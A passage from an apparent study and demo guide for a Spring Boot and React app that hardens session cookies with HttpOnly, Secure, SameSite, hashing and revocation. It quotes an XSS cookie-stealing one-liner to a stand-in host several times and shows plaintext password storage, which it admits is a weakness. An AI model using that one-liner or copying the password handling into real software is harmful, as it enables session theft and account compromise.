public ResponseEntity<?> register(@RequestBody Map<String, String> body) {

    String username = trim(body.get("username"));
    String password = trim(body.get("password"));
    String fullName = trim(body.get("fullName"));
    String email    = trim(body.get("email"));

    if (username.isEmpty() || password.isEmpty()
        || fullName.isEmpty() || email.isEmpty()) {
        return error("Please fill in every field.");
    }

    if (users.existsByUsername(username)) {
        return error("That username is already taken. Try signing in instead.");
    }

    users.save(new AppUser(username, password, fullName, email));   // ← the INSERT

    Map<String, Object> result = new HashMap<>();
    result.put("message", "Account created. You can sign in now.");
    return ResponseEntity.ok(result);
}
```

- `@PostMapping("/register")` → handles `POST /api/register`
- `@RequestBody Map<String,String> body` → Spring converts the incoming JSON into
  a Java Map. `body.get("username")` reads a field out of it.
- `users.save(...)` → the actual `INSERT INTO app_user ...`
- `ResponseEntity.ok(...)` → HTTP 200 + the map, auto-converted back to JSON

**No cookie is involved here.** Registering only touches the database.

### Endpoint 2 — Sign in (checks the DATABASE, starts a SESSION, sends its id)

```java
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody Map<String, String> body,
                               HttpServletRequest request,      // what came IN
                               HttpServletResponse response) {  // what goes OUT

    String username = trim(body.get("username"));
    String password = trim(body.get("password"));

    Optional<AppUser> found = users.findByUsername(username);

    if (found.isEmpty() || !found.get().getPassword().equals(password)) {
        return error("Wrong username or password.");
    }

    AppUser user = found.get();

    // Count the visit on the ACCOUNT, not on the session.
    int visits = user.recordVisit();
    users.save(user);

    String oldToken = readToken(request);

    // Always issue a BRAND-NEW id, never reuse the one we were handed.
    sessions.revoke(oldToken);

    SessionService.IssuedSession issued = sessions.mint(user, visits);
    response.addHeader(HttpHeaders.SET_COOKIE,
                       buildCookie(issued.token(), cookieMaxAge).toString());

    return ResponseEntity.ok(info(issued.session()));
}
```

Five steps, in order:

1. **Look the user up** in the database.
2. **Check the password.** One deliberate error message for both wrong-user and
   wrong-password, so an attacker can't discover which usernames exist.
3. **Count the visit** on the account row.
4. **Revoke the old id**, then **mint a new one**.
5. **Send the new id** as a hardened cookie.

Step 4 is worth stopping on, because it is the one that looks redundant and
isn't. It defends against **session fixation**:

> The attack: someone gets a value into your browser's cookie jar *before* you
> sign in — via a subdomain, a stray `Set-Cookie`, a link with a session in it.
> They then wait for you to log in, and use that same value themselves. It is now
> attached to your account. Minting a fresh id at the exact moment privilege
> changes makes whatever they planted worthless.

Note the two extra parameters. You don't pass those yourself — you just declare
them and Spring supplies them:
- `HttpServletRequest` = everything the browser sent (headers, cookies)
- `HttpServletResponse` = the reply you're building (where the cookie is attached)

### Endpoint 3 — Me (resolves the session id)

```java
@GetMapping("/me")
public ResponseEntity<?> me(HttpServletRequest request) {

    Optional<UserSession> session = sessions.lookup(readToken(request));

    Map<String, Object> result = new HashMap<>();
    if (session.isEmpty()) {
        result.put("found", false);          // brand new visitor, or a dead id
        return ResponseEntity.ok(result);
    }

    // Reaching here means a live session resolved with no password typed:
    // a refresh, a reopened browser, a new tab. That is a visit.
    users.findByUsername(session.get().getUsername()).ifPresent(user -> {
        user.recordVisit();
        users.save(user);
    });

    result.putAll(info(session.get()));
    result.put("found", true);
    return ResponseEntity.ok(result);
}
```

**This is the most important endpoint in the project now.** React calls it before
it draws anything, on every single page load. If a session comes back, you go
straight to the account screen. **That is what "staying signed in" actually is** —
there is no magic beyond this: a cookie arrives, a row is found, and the answer
is "yes, that's Tejas".

Two things it does:

1. **Answers "am I signed in?"** — and the answer drives which screen React shows.
2. **Counts the visit.** No password was typed, so this is a *return* visit, which
   is exactly what the counter is for. Note it only counts when a session actually
   resolves: an anonymous page load, or one with a dead cookie, counts nothing.

The old version of this method had to decode the cookie, split it on `|`,
validate the number of parts, and parse an integer — all of it defensive code
against a value the user controls. **All of that is gone.** There is nothing in
the request to parse, because everything the browser sent is one id. The data
comes from a row.

That is the real shape of the improvement: not "we added checks", but "we
removed the thing that needed checking".

### Endpoint 4 — Logout (a real, server-side logout)

```java
@PostMapping("/logout")
public ResponseEntity<?> logout(HttpServletRequest request, HttpServletResponse response) {

    sessions.revoke(readToken(request));                    // 1. the truth
    response.addHeader(HttpHeaders.SET_COOKIE,
            buildCookie("", Duration.ZERO).toString());     // 2. the tidy-up

    ...
}
```

Two steps, and **the order tells you which one matters**. Deleting the row is the
one that counts; clearing the cookie is housekeeping in the browser afterwards.
Doing only the second is exactly what the old version did, and it is why a copied
cookie stayed valid for the full 30 days.

**There is no way to "delete" a cookie directly.** The server can only send a new
one. So you send a cookie with the same name, an empty value, and `Max-Age=0`,
which tells the browser it expired the instant it arrived.

> **This endpoint used to be called `/api/forget`, and there was no logout at
> all.** Back then, signing out was purely a screen change inside React that
> never contacted the server, because the cookie was a "remember me" note rather
> than a credential.
>
> That stopped working the moment a live session started keeping you signed in
> across a refresh. If sign-out only cleared React state, the very next page load
> would call `/api/me`, find the session still alive, and sign you straight back
> in. **Sign-out has to reach the server now**, so it does, and the endpoint is
> named for what it actually does.
>
> The old "Forget me" button is gone with it — it would have done the same job
> as this one.

### The cookie helpers

The old helper had to glue four values into one string and URL-encode them.
There is one value now, so all that is left is setting the attributes:

```java
private ResponseCookie buildCookie(String value, Duration maxAge) {
    return ResponseCookie.from(cookieName, value)
            .httpOnly(true)
            .secure(cookieSecure)
            .sameSite(cookieSameSite)
            .path("/")
            .maxAge(maxAge)
            .build();
}
```

> **Why Spring's `ResponseCookie` and not the old `jakarta.servlet.http.Cookie`?**
> One practical reason: the servlet `Cookie` class has no setter for `SameSite`.
> With it you end up hand-splicing that attribute onto a header string, which is
> exactly the kind of thing that breaks quietly.

The finished header, copied from a real response:

```http
Set-Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos; Path=/; Max-Age=2592000; Expires=Fri, 04 Sep 2026 11:39:09 GMT; Secure; HttpOnly; SameSite=Lax
```

**Know this table cold — it is what the whole change is judged on:**

| Attribute | What it does | What it stops |
|---|---|---|
| `HttpOnly` | JavaScript cannot see this cookie; `document.cookie` does not list it | An XSS bug stealing the session with `fetch('evil.com?c='+document.cookie)` |
| `Secure` | The browser only attaches it to `https://` requests | Anyone on the same wifi reading the session id off the wire |
| `SameSite=Lax` | Sent on normal navigation to our site, **not** on requests another site fires at us | CSRF — `evil.com` silently POSTing to `/api/logout` with your cookie |
| `Path=/` | Sent for every page of our site | (convenience, not security) |
| no `Domain` | Host-only: this exact host, no subdomains | A compromised subdomain receiving the cookie |
| `Max-Age` | How long the browser should keep it; `0` = delete now | (a request, not a guarantee — `expires_at` is the enforced one) |

On the `SameSite` choices: `Strict` is tighter but drops the cookie when you
follow a link in from another site, which surprises people. `None` sends it on
every cross-site request and is only for genuinely cross-domain APIs — and
browsers reject `None` unless `Secure` is also set.

Reading it back is now a one-liner, because there is nothing to decode:

```java
private String readToken(HttpServletRequest request) {
    if (request.getCookies() == null) return null;     // no cookies at all

    for (Cookie cookie : request.getCookies()) {       // loop ALL cookies
        if (cookieName.equals(cookie.getName()) && !cookie.getValue().isEmpty()) {
            return cookie.getValue();
        }
    }
    return null;
}
```

The browser sends *all* its cookies for the site, so you loop through and pick
yours out by name.

## 4.10 `SessionSecurityTest.java` — ★ the proof

Seventeen tests, so that "the cookie is secure now" is something the build checks
rather than something we remember to be true. Run them with `.\mvnw.cmd test`.

The two most quotable:

```java
@Test
void cookieIsHardened() throws Exception {
    String header = signIn().getHeader(HttpHeaders.SET_COOKIE);
    assertThat(header)
            .contains("HttpOnly")
            .contains("Secure")
            .contains("SameSite=Lax")
            .contains("Path=/")
            .contains("Max-Age=2592000");
}

@Test
void databaseStoresOnlyTheHash() throws Exception {
    String token = tokenFrom(signIn());
    assertThat(sessions.findById(token)).isEmpty();                     // not the raw value
    assertThat(sessions.findById(SessionService.hash(token))).isPresent();  // the hash
}
```

There is also one that replays the **old** attack — a hand-written
`tejas|Someone Else|evil@example.com|999` cookie — and asserts it now returns
`{"found": false}`. That is the single best test to show someone.

**[TESTING.md](TESTING.md) has the full list**, plus the manual browser checks
that `MockMvc` cannot do: `MockMvc` can prove we *wrote* `HttpOnly` onto the
header, but only a real browser can prove it *hides the cookie from JavaScript*.

---

# Part 5 — The frontend, file by file

## 5.1 `setupProxy.js` and `.env` — how the two servers stay one origin

`package.json` used to carry one crucial line:

```json
"proxy": "http://localhost:8080",
```

**That line was the most important one in the whole frontend, and it has been
replaced** — not because the idea changed, but because the simple `proxy` field
refuses to connect to a self-signed certificate. Which is correct of it! That
check is the entire point of certificate validation.

Create React App looks for `src/setupProxy.js` and, if it finds one, uses it
*instead* of the `proxy` key. So the key was removed to avoid two sources of
truth:

```js
const { createProxyMiddleware } = require("http-proxy-middleware");

module.exports = function (app) {
  app.use("/api", createProxyMiddleware({
    target: "https://localhost:8443",
    changeOrigin: true,
    secure: false,      // dev only: trust our self-signed certificate
  }));
};
```

The reason any of this exists is unchanged, and is still the thing to say out
loud: React runs on port 3000, Java on 8443. Different ports = different origins
as far as the browser is concerned, and browsers **do not send cookies across
origins** by default. The proxy means the browser only ever talks to
`localhost:3000` and thinks it is all one website. Cookies just work — and with
`SameSite` now in play, same-origin is what lets it work with **no CORS
configuration at all**.

> **`secure: false` is the one line here you must be able to defend.** It means
> "do not verify the backend's certificate", and it is here only because our
> development certificate is self-signed and therefore untrusted by design. The
> traffic is still encrypted either way; what is switched off is the check on
> *who* is at the other end. In production this would be the man-in-the-middle
> hole that HTTPS exists to close.

And `frontend/.env`:

```
HTTPS=true
PORT=3000
```

Why serve the frontend over HTTPS when only the backend sets the cookie? Because
a `Secure` cookie is only stored and sent back on a connection the browser
considers trustworthy. Chrome and Firefox make a deliberate exception for
`localhost`, so it would mostly work without this — but Safari does not, and
relying on a browser quirk to demo a security feature is a bad look.

> **Likely question: "How do the two servers talk?"**
> "React's dev server proxies `/api` calls to Spring Boot over HTTPS, so the
> browser sees a single origin. That keeps cookies working without any CORS
> setup, and it is also what production looks like — one origin serving both the
> bundle and the API."

## 5.2 `public/index.html` — the empty shell

```html
<div id="root"></div>
```

That's the entire page. React injects everything into that one empty div.
This file also sets the browser-tab title and loads the Inter font.

## 5.3 `index.js` — startup + theme

```js
const glassTheme = {
  algorithm: theme.darkAlgorithm,       // flip all Ant Design components to dark
  token: {
    colorPrimary: "#6366f1",            // the indigo used by buttons/focus rings
    borderRadius: 10,
    fontFamily: "'Inter', …",
    …
  },
};

ReactDOM.createRoot(document.getElementById("root")).render(
  <ConfigProvider theme={glassTheme}>
    <App />
  </ConfigProvider>
);
```

- `createRoot(...).render(...)` — "put my app inside that empty div".
- `ConfigProvider` — wraps the app and restyles **every** Ant Design component at
  once, so we never theme buttons one at a time.

## 5.4 `api.js` — the 4 calls to Java

```js
const jsonPost = (url, body) =>
  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    credentials: "include",              // ★
    body: JSON.stringify(body || {}),
  }).then(handle);

export const fetchMe  = () => fetch("/api/me", { credentials: "include" }).then(handle);
export const register = (payload) => jsonPost("/api/register", payload);
export const login    = (payload) => jsonPost("/api/login", payload);
export const logout   = () => jsonPost("/api/logout");
```

**`credentials: "include"` is the second-most-important line in the frontend.**
It means "browser, attach my cookies to this request, and save any cookie that
comes back". Leave it out and the cookie is never sent — the app would forget
you every time.

`JSON.stringify` turns a JS object into text to send; `response.json()` turns the
reply back into an object. `handle()` checks whether the response was OK and
throws the server's message if not, so the form can display it.

**Notice what this file cannot do any more.** There is no way, anywhere in the
frontend, to read the session id — `document.cookie` does not list it, because
the cookie is `HttpOnly`. That is not a limitation to work around; it *is* the
protection. If our own code cannot read it, neither can a script that gets
injected into our page. The frontend never handles the session id at all: the
browser attaches it, Java resolves it, and the answer arrives as ordinary JSON.

## 5.5 `App.js` — ★ where "staying signed in" actually happens

If you only read one frontend file, read this one. Everything the backend built
would be wasted without the twelve lines below.

React components keep **state** — remembered values that redraw the screen when
they change. This one keeps two:

```js
const [loading, setLoading] = useState(true);   // still resolving the session?
const [user, setUser]       = useState(null);   // who is signed in (null = nobody)
```

`useState` gives you `[currentValue, functionToChangeIt]`. Calling the setter
redraws the screen automatically.

### The twelve lines that keep you logged in

```js
useEffect(() => {
  if (asked.current) return;      // StrictMode guard — see below
  asked.current = true;

  fetchMe()
    .then((data) => {
      if (data.found) {
        setUser(data);            // ★ a live session → straight to the account screen
      }
    })
    .catch(() => { /* backend not running — show a clean form */ })
    .finally(() => setLoading(false));
}, []);
```

`useEffect(..., [])` = "run this once, when the page first loads."

**`setUser(data)` is the whole feature.** The screen is chosen by:

```jsx
{user ? <Account … /> : <AuthPanel … />}
```

So setting `user` from the session result means: cookie arrives → server resolves
it → account screen, with nobody typing anything. Refresh, new tab, reopen the
browser next week — all of them run this exact path.

> **This is precisely what was broken before.** The old version put the result
> into a *different* variable (`remembered`) that was only used to pre-fill the
> username box, and never touched `user`. So the session was alive, the server
> said "yes, that's Tejas", and React showed the login form anyway. One
> misdirected line.

### Why the `asked` ref is there

```js
const asked = useRef(false);
```

`index.js` wraps the app in `<React.StrictMode>`, and React 18's StrictMode
**deliberately runs every effect twice in development** to expose effects that
are not safe to repeat.

Ours is not safe to repeat — `/api/me` increments the visit counter on the
server. Without the guard, every refresh would count as two visits while
developing and one in a production build, which is exactly the sort of
inconsistency that wastes an afternoon.

A `useRef` holds a value that survives re-renders without causing one. Setting
`asked.current = true` on the first run makes the second run return immediately.

### Signing out has to reach the server

```js
const handleSignOut = async () => {
  await logout();          // deletes the session row on the server
  setUser(null);           // then update the screen
};
```

Clearing React state alone would do nothing useful: the session row would still
be alive, so the very next refresh would call `/api/me`, get a valid session
back, and sign you straight back in. **The server call is the sign-out; the
`setUser(null)` is just the screen catching up.**

## 5.6 `AuthPanel.js` — the sign-in / register form

```js
const [tab, setTab] = useState("signin");   // "signin" or "register"
const [busy, setBusy] = useState(false);    // disables the button mid-request
const [alert, setAlert] = useState(null);   // the red/green message
```

One component does both jobs; `tab` decides which. In register mode two extra
fields appear:

```jsx
{tab === "register" && (
  <>
    <Form.Item name="fullName" …><Input … /></Form.Item>
    <Form.Item name="email" …><Input … /></Form.Item>
  </>
)}
```

`{condition && <jsx/>}` is the standard React way of saying "only render this if
the condition is true".

Validation is declared, not coded:

```jsx
rules={[
  { required: true, message: "Please enter your email" },
  { type: "email", message: "That does not look like an email" },
]}
```

Ant Design checks these before it will submit, and shows the message underneath
the field. On submit:

```js
if (tab === "signin") {
  const data = await login(values);
  onSignedIn(data);                       // hand the user up to App.js
} else {
  await register(values);
  setTab("signin");                       // registered → switch to the sign-in tab
}
```

This component used to pre-fill the username from the session, so a returning
visitor only had to type their password. **That is gone, and it had to go** — a
returning visitor with a live session never reaches this screen at all now. App.js
resolves the session first and goes straight to the account panel. You only see
this form when there is genuinely nobody signed in, and then there is nothing to
pre-fill from.

## 5.7 `Account.js` — the screen after signing in

Deliberately minimal: a name and an email, and nothing else.

The interesting thing about this file is what is **absent** from it. The old
version displayed the raw cookie on screen:

```js
// the OLD Account.js — this cannot work any more
const rawCookie = document.cookie
  .split("; ")
  .find((row) => row.startsWith("userInfo="));
```

`document.cookie` is JavaScript's view of the cookies for this site. That line
only ever worked because `httpOnly` was deliberately set to `false`. It made a
nice demo of what a cookie *is*, and a poor demo of security — **the same
setting that let our page read the cookie would have let an injected `<script>`
read it too.** There is no way to have one without the other, so it went.

So the name and email on this screen did not come from the browser at all. They
arrived as JSON from `/api/me`, which read them off a database row. The component
never sees a session id, and has no way to.

> **If you want the live proof during a demo**, open `F12` → **Console** and
> type `document.cookie`. `sid` will not be in the output, even though the
> browser is attaching it to every single request. That is `HttpOnly` working.

One button, and it does the real thing:

```jsx
<Button block danger onClick={onSignOut}>Sign out</Button>
```

There used to be two — "Sign out" (screen change only) and "Forget me" (delete
the session). Once sign-out had to genuinely end the session, the second button
would have done exactly the same job, so it went.

## 5.8 `glass.css` — the look

Dark **glassmorphism**. Three ingredients stacked:

```css
.panel {
  background: rgba(255, 255, 255, 0.045);   /* 1. barely-there white */
  backdrop-filter: blur(28px) saturate(160%); /* 2. blur whatever is BEHIND it */
  border: 1px solid rgba(255, 255, 255, 0.09); /* 3. a thin lit edge */
}
```

`backdrop-filter` is the one that matters — it blurs the *background* showing
through the panel, which is exactly what frosted glass does. The `.glow` divs
behind it are large blurred coloured circles; without them there would be
nothing interesting to blur and the effect would be invisible.

---

# Part 6 — Where the cookie actually lives (you asked this)

## Where on disk

Not in your project. In the **browser's profile folder**, in a file literally
named `Cookies` with no extension:

```
Chrome:   C:\Users\tejas\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies
Edge:     C:\Users\tejas\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies
Firefox:  …\Mozilla\Firefox\Profiles\<profile>\cookies.sqlite
```

On your machine the Chrome one is a real file about **1.28 MB**.

## How it's stored

That file is a **SQLite database** — every cookie from every website you've
ever visited is one row in a table. Ours now looks like this:

| host_key | name | encrypted_value | path | expires_utc | is_secure | is_httponly | samesite |
|---|---|---|---|---|---|---|---|
| localhost | sid | (encrypted blob) | / | (timestamp) | **1** | **1** | **Lax** |

The three bolded columns used to be `0`, `0`, and unset. **The browser is
tracking our attributes in its own storage** — that is not us claiming we asked
for them, it is the browser recording that it will enforce them.

Three things worth knowing:

1. **It's a database, not a text file.** Try to read it while Chrome is running
   and Windows refuses: *"the process cannot access the file because it is being
   used by another process"* — Chrome holds it open the whole time. That's a fine
   thing to mention; it shows it's a live database.
2. **The values are encrypted on disk.** Chrome encrypts each value with a key
   protected by Windows DPAPI, so you can't just open the file and read
   everyone's cookies.
3. **Only cookies with an expiry get written to disk.** Ours has `Max-Age`, so it
   is saved and survives a reboot. A cookie with no expiry ("session cookie")
   lives in memory only and dies when the browser closes.

## How it's accessed — three ways (one of which no longer works)

**1. Automatically, by the browser (this is the one that matters).**

Nobody writes code for this. On *every* request to a matching domain and path,
where the cookie hasn't expired, the browser attaches a header:

```http
GET /api/me HTTP/1.1
Host: localhost:3000
Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos
```

Java reads it back with `request.getCookies()`. And the server writes one by
sending the mirror-image header — this is the real response our app sends:

```http
HTTP/1.1 200
Set-Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos; Path=/; Max-Age=2592000; Expires=Fri, 04 Sep 2026 11:39:09 GMT; Secure; HttpOnly; SameSite=Lax
```

`ResponseCookie` in Java produces exactly that `Set-Cookie` line, and
`cookie.getValue()` reads exactly that `Cookie` line. **Cookies are just two
HTTP headers.** That is the whole mechanism.

Compare the two `Cookie:` lines — the old one carried a name, an email address
and a counter across the network in plain text on every request. The new one
carries 43 meaningless characters, inside TLS.

**2. From JavaScript** — `document.cookie`. **This no longer works, on purpose.**
The cookie is `HttpOnly`, so it is simply absent from that string. Our own
Account screen demonstrates the absence rather than the value.

**3. From DevTools** — `F12` → **Application** → **Cookies** →
`https://localhost:3000`. This is what to show on screen in the meeting: point at
the gibberish in the Value column, then at the ✔ in the HttpOnly and Secure
columns.

> **Likely question: "Is a cookie secure?"**
> "The cookie itself is just text the browser stores — so the question is what
> you put in it. Ours holds a random id and nothing else, so reading it tells you
> nothing and editing it makes it stop working. `HttpOnly` keeps scripts away
> from it, `Secure` keeps it off unencrypted connections, `SameSite` keeps other
> sites from using it, and because the real state is a row on the server, we can
> revoke it whenever we like."

---

# Part 7 — The full request lifecycle

What happens when you press **Sign in**:

```
1. You click the button
        ↓
2. AuthPanel.js  →  api.js  →  fetch("/api/login", {credentials:"include"})
        ↓
3. React dev server (:3000) forwards it to Java (:8443)   ← setupProxy.js, over TLS
        ↓
4. AuthController.login() runs:
     • users.findByUsername("tejas")   → SELECT … FROM app_user WHERE username=?
     • password matches?
     • user.recordVisit()              → UPDATE app_user SET visits = visits + 1
     • sessions.revoke(oldToken)       → DELETE the old row  (fixation defence)
     • sessions.mint(user, 3)          → 32 random bytes → token
                                       → INSERT INTO user_session (sha256(token), …)
     • buildCookie(token, 30 days)     → adds the Set-Cookie header
        ↓
5. Response travels back (inside TLS) with:
     Set-Cookie: sid=ULaB692K…; Path=/; Max-Age=2592000; Secure; HttpOnly; SameSite=Lax
        ↓
6. The BROWSER saves that into its SQLite Cookies file, with is_secure=1,
   is_httponly=1, samesite=Lax
        ↓
7. React shows the Account screen: name and email — both of which arrived as
   JSON, not as cookie contents
```

And when you refresh the page — or close the browser and come back tomorrow:

```
1. Browser loads https://localhost:3000
        ↓
2. App.js useEffect fires  →  fetch("/api/me")
        ↓
3. Browser automatically attaches:  Cookie: sid=ULaB692K…
        ↓
4. AuthController.me() → readToken() → sessions.lookup()
     • sha256(token)                  → 3bb5a229…53fa
     • SELECT … FROM user_session WHERE id = ?
     • expired? then delete it and answer "not signed in"
     • otherwise touch last_seen_at
        ↓
5. It resolved, so this counts as a visit:
     • UPDATE app_user SET visits = visits + 1
        ↓
6. Returns {found:true, fullName:"Tejas Jaiswal", email:"…"}
     (no visits field — that number never leaves the server)
        ↓
7. setUser(data)  →  React draws the ACCOUNT screen. You are still signed in,
   and you typed nothing.
```

**Step 7 is the answer to "why am I still logged in after a refresh?"** There is
no magic: a cookie arrived, a row was found, and React was told who you are.

The single most useful difference to point at: in the old version, step 4 read
the answer out of the request. Now step 4 uses the request only as a lookup key.
**Nothing the user can edit ever reaches the screen.**

### And when you press Sign out

```
1. Account.js  →  api.js  →  fetch("/api/logout", {credentials:"include"})
        ↓
2. AuthController.logout():
     • sessions.revoke(token)  → DELETE FROM user_session WHERE id = sha256(token)
     • Set-Cookie: sid=; Max-Age=0
        ↓
3. setUser(null)  →  the sign-in form
        ↓
4. Refresh now: /api/me finds no row, answers {found:false}, and you stay out.
```

Step 2 is what makes step 4 true. If sign-out had only done step 3, that refresh
would have signed you straight back in — which is exactly the bug that led to
this design.

---

# Part 8 — Your demo script

Have both terminals running before you start, and have `.\mvnw.cmd test` already
run once so nothing downloads live.

### The mechanics (the original demo, still worth showing)

1. **"Here's the sign-in page."** Show it — note the padlock, it is `https://`.
2. **Create account** — fill in name, email, username, password.
3. **Open F12 → Application → Cookies → https://localhost:3000.** Show that there
   is nothing there yet. *(Registering only wrote to the database.)*
4. **Sign in.** The account screen appears: name and email.
   Say: *"Neither of those was in the cookie — they came back as JSON from a
   database row."*
5. **Go back to the cookie panel and refresh it.** The `sid` row is now there.
   Point at three columns: the **Value** (gibberish), and the ✔ under **HttpOnly**
   and **Secure**.
6. **Press F5.** *(This is the moment.)* You stay on the account screen — no
   password, no flicker back to the login form.
   Say: *"The browser sent the cookie, the server found the session row, and
   React went straight to the account screen. That is all 'staying logged in'
   is."*
7. **Close the entire browser. Reopen it.** Still signed in — the cookie has an
   expiry date, so it was written to disk rather than held in memory. This works
   for 30 days.

### The security half (this is the new material — lead with it if time is short)

8. **Open F12 → Console and type `document.cookie`.** `sid` is not in the output.
   Say: *"The cookie is being sent on every single request, and JavaScript still
   cannot see it. That's `HttpOnly`. If anyone ever got a `<script>` onto this
   page, `fetch('evil.com?c='+document.cookie)` would steal nothing."*

9. **Try to tamper.** In DevTools, edit the `sid` value — change one character.
   Refresh. You are signed out. Say: *"There is nothing in there to usefully
   edit. In the old version this field said `tejas|Tejas Jaiswal|…|3`, and I
   could have made it say anything I liked."*

10. **Open https://localhost:8443/h2-console**, JDBC URL
    `jdbc:h2:file:./data/cookiedemo`, user `sa`, no password:

    ```sql
    SELECT * FROM USER_SESSION;
    SELECT USERNAME, VISITS FROM APP_USER;
    ```

    Two things to point at.

    First, the `ID` column does **not** match the cookie in the browser — it is
    the SHA-256 of it. Say: *"Even someone reading this table cannot sign in as
    anybody. It can recognise a session id but never produce one."*

    Second, `VISITS`. Refresh the app a few times, re-run the query, and watch it
    climb. Say: *"That number is nowhere in the browser. Not on screen, not in
    the JSON, not in the cookie. The client is never told it and cannot touch
    it — which is exactly where the old version went wrong."*

11. **Click "Sign out."** The row vanishes from `USER_SESSION` and the cookie
    vanishes from DevTools — but the account, and its visit count, are still in
    `APP_USER`.

    Then **refresh**: you stay signed out, because there is no row to find.

    Say: *"This is the part that was impossible before. Logging out used to be a
    polite request to the browser — if someone had already copied the cookie, it
    kept working for thirty days. Now the truth is a row, and deleting it kills
    every copy of that cookie everywhere, instantly."*

12. **If they want proof rather than assertions:** run `.\mvnw.cmd test` and show
    `Tests run: 17, Failures: 0`. Then open `SessionSecurityTest.java` and show
    `handWrittenPayloadIsRejected` — the test that replays the old attack.

Steps 6, 9 and 11 are the strongest moments. Step 6 shows the feature working;
step 9 shows the attack that used to work now failing; step 11 shows a capability
that did not exist at all.

**[TESTING.md](TESTING.md) has all of this as copy-pasteable commands** if you'd
rather demo from a terminal than a browser.

---

# Part 9 — Questions you might get

**"Why a cookie instead of localStorage?"**
Two reasons. A cookie is attached to every request automatically, so the server
can read it; `localStorage` never leaves the browser. More importantly,
`localStorage` is *always* readable by JavaScript — there is no `HttpOnly` for
it, so any XSS bug empties it. A session cookie can be hidden from script
entirely.

**"What is `HttpOnly` actually protecting against?"**
Cross-site scripting. If an attacker gets a `<script>` onto our page, the
one-liner `fetch('https://evil.com?c='+document.cookie)` used to steal the whole
session. Now it sends an empty string.

**"Why HTTPS if it's only running on your laptop?"**
Because `Secure` is meaningless without it — the attribute says "only send this
over an encrypted connection", so with no TLS the cookie would simply never be
sent. And a security demo that only works over plain HTTP is a demo of the wrong
thing.

**"What's `SameSite=Lax`?"**
The browser sends the cookie on normal navigation to our site, but not on
requests another website fires at us in the background. That is what stops
`evil.com` from silently POSTing to `/api/logout` with your cookie attached — a
CSRF attack. `Strict` is tighter but drops the cookie when you follow a link in
from elsewhere. `None` sends it everywhere and requires `Secure`.

**"Why not just sign the cookie instead of storing sessions?"**
You can — that is roughly what a JWT is, and it saves a database lookup. The
trade is revocation: a signed cookie stays valid until it expires, because there
is nothing on the server to delete. For a "remember me for 30 days" cookie, being
able to kill it instantly is worth one primary-key lookup per request.

**"Why didn't you use Spring Security?"**
It's a demo of cookie and session mechanics, and Spring Security would hide the
very thing I'm demonstrating behind its own session handling. Everything here is
standard Java — `SecureRandom`, `MessageDigest`, `ResponseCookie` — so you can
read all of it. For a real app I'd use Spring Security, and the first thing I'd
take from it is BCrypt for the passwords.

**"The passwords are still in plain text."**
Yes, and that is now the weakest thing in the project by a distance — the cookie
handling is production-shaped and the password storage is not. The fix is small:
add `spring-boot-starter-security`, hash with `BCryptPasswordEncoder` on
register, `matches()` on login.
*(Say this before they find it. It reads as judgment rather than an oversight.)*

**"What if someone edits the cookie?"**
Then it stops working. There is nothing in it but a random id, so editing it
produces an id that matches no row and the answer is "not signed in". This is the
question that had an uncomfortable answer in the old version — someone could
change the name it displayed — and it is the main reason for the change.

**"What if someone steals the cookie anyway?"**
Then they have that session until it expires or someone signs out — and sign-out
now genuinely works. That is why sessions are revocable and why ids rotate on
sign-in: you cannot make theft impossible, so you shrink the window.

**"Does this scale / work with multiple users?"**
Yes. Each browser gets its own session row, and lookups are by primary key.
At real scale you'd move the session table to Redis for the expiry handling,
but the design is identical.

**"What happens if the cookie expires?"**
After 30 days the browser deletes it. Separately, the server refuses any session
past its `expires_at` even if the browser kept the cookie — that is the deadline
that actually counts, because we own it. The next visit looks like a first visit.

**"Why do I stay signed in after refreshing?"**
Because on every page load React asks `/api/me`, the browser attaches the session
cookie automatically, and the server resolves it to a row. No password is typed
because none is needed — the cookie *is* the credential for the next 30 days.
That is what a session is for.

**"So how do I actually log out?"**
The Sign out button calls `/api/logout`, which **deletes the session row**. That
is the part that counts: the cookie is dead everywhere the moment the row is
gone, including any copy somebody else took. Clearing the browser's cookie
afterwards is just tidying up.

Earlier versions of this project had no logout at all — signing out was a screen
change in React, because the cookie was a remember-me note rather than a
credential. That stopped being viable the moment a live session kept you signed
in across a refresh: sign out, refresh, and you would have been signed straight
back in.

**"Where did the sign-in counter go?"**
Onto the account row (`APP_USER.VISITS`), and off the screen entirely. It goes up
on every sign-in *and* every returning page load. It is deliberately never sent
to the browser — not on screen, not in the JSON — so the only way to see it is
`SELECT USERNAME, VISITS FROM APP_USER`. That is the point: a fact about the user
that the client is never told and cannot influence, which is precisely what the
original cookie got wrong.

**"How long did this take / how hard was it?"**
The original cookie version was about 30 lines of real logic. Making it secure
was another 150, mostly the session table and the service around it — and it
needed no new libraries, only `SecureRandom`, `MessageDigest` and five lines of
TLS configuration.

---

# Part 10 — Vocabulary cheat sheet

| Term | Plain meaning |
|---|---|
| **Spring Boot** | Java framework that runs a web server and wires your classes together |
| **Maven / `pom.xml`** | Downloads the libraries your project needs |
| **Annotation** (`@Entity`) | A label on a class/method telling the framework to do something |
| **Controller** | Class that maps URLs to Java methods |
| **Endpoint** | One URL + method, e.g. `POST /api/login` |
| **Entity** | A Java class that mirrors a database table |
| **Repository** | Interface for database queries; Spring writes the SQL |
| **JPA / Hibernate** | The layer that turns Java objects into SQL |
| **H2** | A database that runs inside your app as a file — no install |
| **JSON** | The text format the two sides exchange: `{"name":"Tejas"}` |
| **REST API** | Sending JSON over HTTP URLs |
| **Cookie** | Small text the server asks the browser to store and resend |
| **`Set-Cookie` / `Cookie`** | The two HTTP headers that write / send a cookie |
| **`maxAge`** | Seconds the browser keeps it. `0` = delete now |
| **`HttpOnly`** | JavaScript can't read the cookie — defends against XSS theft |
| **`Secure`** | The browser only sends the cookie over HTTPS |
| **`SameSite`** | Controls whether other sites' requests carry the cookie — defends against CSRF |
| **Session** | Server-side record of "this browser is signed in as X" |
| **Session id / token** | The random value in the cookie that points at that record |
| **Opaque** | A value that carries no information — you can't learn anything by reading it |
| **`SecureRandom`** | Java's cryptographic random source; unpredictable, unlike `Random` |
| **SHA-256** | One-way fingerprint of a value. Same input → same output; can't be reversed |
